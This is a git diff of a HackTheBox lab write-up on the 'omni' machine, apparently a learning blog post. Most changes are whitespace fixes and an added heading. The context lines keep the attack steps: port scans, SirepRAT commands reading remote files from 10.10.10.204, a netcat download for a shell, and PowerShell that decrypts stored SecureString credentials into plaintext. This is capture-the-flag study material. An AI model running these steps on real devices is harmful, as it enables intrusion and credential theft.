@@ -3,7 +3,6 @@ title: Lab - HackyHour4
 date: 2020-11-13 11:11:11 -0400
 description: Learning Path
 categories: [Lab, HackTheBox]
-# img: /assets/img/sample/rabbit.png
 tags: [Lab, HackTheBox]
 ---
 
@@ -14,8 +13,14 @@ tags: [Lab, HackTheBox]
 
 # omni
 
+
+<img src="https://i.imgur.com/GcY1wEq.png" width="700">
+
+
 > Machine: omni
 
+
+## Step 1: Recon
 
 ```bash
 Remington Winters  21:18
@@ -42,7 +47,7 @@ PORT      STATE SERVICE  VERSION
 135/tcp   open  msrpc    Microsoft Windows RPC
 5985/tcp  open  upnp     Microsoft IIS httpd
 8080/tcp  open  upnp     Microsoft IIS httpd
-| http-auth: 
+| http-auth:
 | HTTP/1.1 401 Unauthorized\x0D
 # |_  Basic realm=Windows Device Portal    win device
 |_http-server-header: Microsoft-HTTPAPI/2.0
@@ -67,7 +72,7 @@ git clone https://github.com/SafeBreach-Labs/SirepRAT.git
 pip3 install enum34
 pip2 install enum34
 pip2 install hexdump
-pip install -r requirements.txt 
+pip install -r requirements.txt
 
 
 python SirepRAT.py 10.10.10.204 GetFileInformationFromDevice
@@ -82,7 +87,7 @@ python SirepRAT.py 10.10.10.204 GetFileInformationFromDevice
 python2 SirepRAT.py 10.10.10.204 GetSystemInformationFromDevice
 <SystemInformationResult | type: 51, payload length: 32, kv: {'wProductType': 0, 'wServicePackMinor': 2, 'dwBuildNumber': 17763, 'dwOSVersionInfoSize': 0, 'dwMajorVersion': 10, 'wSuiteMask': 0, 'dwPlatformId': 2, 'wReserved': 0, 'wServicePackMajor': 1, 'dwMinorVersion': 0, 'szCSDVersion': 0}>
 
- 
+
 python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\Windows\System32\drivers\etc\hosts" --v
 # Additionally, comments (such as these) may be inserted on individual
 # lines or following the machine name denoted by a '#' symbol.
@@ -167,8 +172,8 @@ python SirepRAT.py 10.10.10.204 GetFileFromDevice --remote_path "C:\Windows\Syst
 
 # download the netcat
 wget https://eternallybored.org/misc/netcat/netcat-win32-1.11.zip
-unzip netcat-win32-1.11.zip 
-sudo rm netcat-win32-1.11.zip 
+unzip netcat-win32-1.11.zip
+sudo rm netcat-win32-1.11.zip
 
 
 # open cd
@@ -271,14 +276,14 @@ PS C:\Data\Users\app> cat user.txt
 
 
 
-# ------------------------------ from txt to System.Security.SecureString 
-PS C:\>$encrypted 
-01000000d08c9ddf0115d1118c7a00c04fc297eb010000001a114d45b8dd3f4aa11ad7c0abdae9800000000002000000000003660000a8000000100000005df63cea84bfb7d70bd6842e7 
-efa79820000000004800000a000000010000000f10cd0f4a99a8d5814d94e0687d7430b100000008bf11f1960158405b2779613e9352c6d14000000e6b7bf46a9d485ff211b9b2a2df3bd 
-6eb67aae41 
-PS C:\>$secure2 = convertto-securestring -string $encrypted 
-PS C:\>$secure2 
-System.Security.SecureString 
+# ------------------------------ from txt to System.Security.SecureString
+PS C:\>$encrypted
+01000000d08c9ddf0115d1118c7a00c04fc297eb010000001a114d45b8dd3f4aa11ad7c0abdae9800000000002000000000003660000a8000000100000005df63cea84bfb7d70bd6842e7
+efa79820000000004800000a000000010000000f10cd0f4a99a8d5814d94e0687d7430b100000008bf11f1960158405b2779613e9352c6d14000000e6b7bf46a9d485ff211b9b2a2df3bd
+6eb67aae41
+PS C:\>$secure2 = convertto-securestring -string $encrypted
+PS C:\>$secure2
+System.Security.SecureString
 
 
 
@@ -315,7 +320,7 @@ $Credential = New-Object -TypeName PSCredential -ArgumentList "adm.ms@easy365man
 $Ptr = [System.Runtime.InteropServices.Marshal]::SecureStringToCoTaskMemUnicode($password)
 $result = [System.Runtime.InteropServices.Marshal]::PtrToStringUni($Ptr)
 [System.Runtime.InteropServices.Marshal]::ZeroFreeCoTaskMemUnicode($Ptr)
-$result 
+$result
 
 
 $credentials99 = New-Object System.Net.NetworkCredential("flag", $passwor99, "TestDomain")
@@ -353,7 +358,7 @@ PS> $credentialgg.GetNetworkCredential()
 PS51> $credentialgg.GetNetworkCredential().Password
 # MySecretPassword
 
-$securePassword = '01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7' 
+$securePassword = '01000000d08c9ddf0115d1118c7a00c04fc297eb010000009e131d78fe272140835db3caa288536400000000020000000000106600000001000020000000ca1d29ad4939e04e514d26b9706a29aa403cc131a863dc57d7d69ef398e0731a000000000e8000000002000020000000eec9b13a75b6fd2ea6fd955909f9927dc2e77d41b19adde3951ff936d4a68ed750000000c6cb131e1a37a21b8eef7c34c053d034a3bf86efebefd8ff075f4e1f8cc00ec156fe26b4303047cee7764912eb6f85ee34a386293e78226a766a0e5d7b745a84b8f839dacee4fe6ffb6bb1cb53146c6340000000e3a43dfe678e3c6fc196e434106f1207e25c3b3b0ea37bd9e779cdd92bd44be23aaea507b6cf2b614c7c2e71d211990af0986d008a36c133c36f4da2f9406ae7'
 
 $Credential.GetNetworkCredential().password
 
@@ -627,7 +632,7 @@ if "__main__" == __name__:
                         help="Verbose - if printable, print result")
     parser.add_argument('--vv', action='store_true', default=False,
                         help="Very verbose - print socket buffers and more")
-    
+
     args = parser.parse_args()
 
     if args.command_type == CommandType.LaunchCommandWithOutput.name:
